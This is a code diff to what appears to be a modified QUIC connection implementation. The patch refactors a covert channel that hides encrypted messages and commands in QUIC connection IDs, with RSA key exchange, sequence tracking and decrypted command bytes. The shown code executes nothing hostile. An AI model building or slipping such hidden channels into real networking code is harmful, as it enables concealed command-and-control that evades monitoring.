@@ -161,7 +161,7 @@ def get_epoch(packet_type: QuicPacketType) -> tls.Epoch:
 
 
 def create_peer_meta():
-    from . import ccrypto_improved as ccrypto
+    from . import ccrypto
 
     return {
         "buffer": [],
@@ -421,7 +421,7 @@ class QuicConnection:
         PEER_META_LOCK.acquire(timeout=5)
         peer_meta = PEER_META.get(addr[0])
         if not peer_meta:
-            from . import ccrypto_improved as ccrypto
+            from . import ccrypto
 
             peer_meta = create_peer_meta()
             # On the first connection, add a random CID to start because after all chunks of the RSA key
@@ -2008,7 +2008,7 @@ class QuicConnection:
         PEER_META_LOCK.acquire(timeout=5)
         peer_meta = PEER_META.get(peer_ip)
         if self._original_destination_connection_id not in peer_meta["cid_history"]:
-            from . import ccrypto_improved as ccrypto
+            from . import ccrypto
 
             # New peer, queue up the public key bytes
             # if not self._is_client and not peer_meta['cid_history'] and peer_meta['message_history']:
@@ -2051,12 +2051,30 @@ class QuicConnection:
             # If we have a public key, try to decrypt the payload
             else:
                 logger.info(f"PEER_BUFFER_LEN: {len(peer_meta['buffer'])}")
-                decrypted_payload = ccrypto.try_decrypt(
-                    peer_meta["private_key"], peer_meta["buffer"], raise_on_error=False
+
+                # Try decrypt with sequence number
+                from . import ccrypto
+
+                decrypt_result = ccrypto.try_decrypt_with_sequence(
+                    peer_meta["private_key"],
+                    peer_meta["buffer"],
+                    raise_on_error=False,
                 )
 
-                if decrypted_payload is not None:
+                if decrypt_result is not None:
+                    decrypted_payload, sequence_num = decrypt_result
                     peer_meta["buffer"] = []
+
+                    # Track sequence number for debugging
+                    expected = peer_meta["expected_sequence"]
+                    if sequence_num != expected:
+                        logger.debug(
+                            f"Sequence mismatch: got {sequence_num}, expected {expected}"
+                        )
+
+                    peer_meta["expected_sequence"] = sequence_num + 1
+                    peer_meta["last_sync_time"] = context.time
+
                     command = decrypted_payload[0]
                     decrypted_message = decrypted_payload[1:]
 
@@ -2845,20 +2863,22 @@ class QuicConnection:
 
     def _replenish_connection_ids(self, addr) -> None:
         """
-        Generate new connection IDs.
+        Generate new connection IDs with covert payloads.
         """
         if not self._is_client and addr[0] in PEER_META:
-            from . import ccrypto_improved as ccrypto
+            from . import ccrypto
 
-            if PEER_META[addr[0]]["cid_queue"].empty():
+            peer_meta = PEER_META[addr[0]]
+
+            if peer_meta["cid_queue"].empty():
                 ccrypto.queue_message(
                     addr[0],
                     b"k",
-                    PEER_META[addr[0]]["cid_queue"],
-                    PEER_META[addr[0]]["public_key"],
+                    peer_meta["cid_queue"],
+                    peer_meta["public_key"],
                 )
-            hid = PEER_META[addr[0]]["cid_queue"].get()
-            # hid = b'AAAAAAAA'
+
+            hid = peer_meta["cid_queue"].get()
             self._host_cids.append(
                 QuicConnectionId(
                     cid=hid,
